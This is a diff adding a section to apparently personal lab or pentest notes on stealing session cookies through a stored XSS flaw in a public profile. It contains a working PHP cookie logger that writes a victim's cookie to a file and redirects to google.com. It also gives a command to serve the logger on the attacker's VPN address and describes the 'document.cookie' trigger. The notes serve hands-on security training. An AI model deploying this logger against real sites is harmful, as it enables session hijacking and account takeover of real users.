@@ -282,3 +282,27 @@ lets now check to see if the HTTPOnly setting is off:
 ### Obtaining session cookies through XSS 
 
 lets now create a cookie-logging script in PHP to practice obtaining a victim's session cookie through sharing a vulnerable link to the stored XSS public profile   
+
+```php
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+```
+
+the above script waits for anyone to request `?c=+document.cookie` and it will parse the included cookie 
+
+we can run the script with: 
+
+```shell
+ php -S <VPN/TUN Adapter IP>:8000
+```
+
+
